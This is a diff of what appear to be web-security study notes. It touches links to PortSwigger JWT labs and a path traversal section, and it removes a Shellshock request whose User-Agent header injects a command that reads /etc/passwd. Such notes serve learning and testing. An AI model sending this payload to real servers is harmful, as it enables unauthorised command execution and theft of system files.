@@ -465,11 +465,6 @@ system('ls')
   - [1 (EXPERT)](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-algorithm-confusion)
   - [2 (EXPERT)](../port-swigger/jwt.md#lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key)
 
-HEAD /cgi-bin/status HTTP/1.1
-User-Agent: () { :;}; echo \$(</etc/passwd)
-Host: vulnerable
-Connection: close
-
 ## Path traversal
 
 <!-- ### Payloads -->
